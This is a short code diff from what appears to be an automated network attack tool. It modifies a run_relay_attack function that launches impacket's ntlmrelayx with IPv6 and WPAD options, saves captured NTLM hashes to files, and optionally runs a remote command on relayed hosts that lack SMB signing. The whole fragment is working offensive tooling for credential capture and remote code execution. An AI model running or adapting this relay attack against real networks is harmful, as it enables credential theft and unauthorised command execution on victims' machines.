@@ -965,8 +965,14 @@ def run_relay_attack(iface, args):
         signing_disabled = ' -tf smb-signing-disabled-hosts.txt'
     else:
         signing_disabled = ''
-    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                 ' -of hashes/ntlmrelay-hashes{} -wa 3 -c "{}"'.format(signing_disabled, remote_cmd))
+
+    # I'm aware this can be more elegant but I don't feel like doing it right now (send PRs)
+    if args.command == 'default':
+        relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
+                     ' -of hashes/ntlmrelay-hashes{} -wa 3'.format(signing_disabled))
+    else:
+        relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
+                     ' -of hashes/ntlmrelay-hashes{} -wa 3 -c "{}"'.format(signing_disabled, remote_cmd))
 
     ntlmrelay_proc = run_proc(relay_cmd)
 
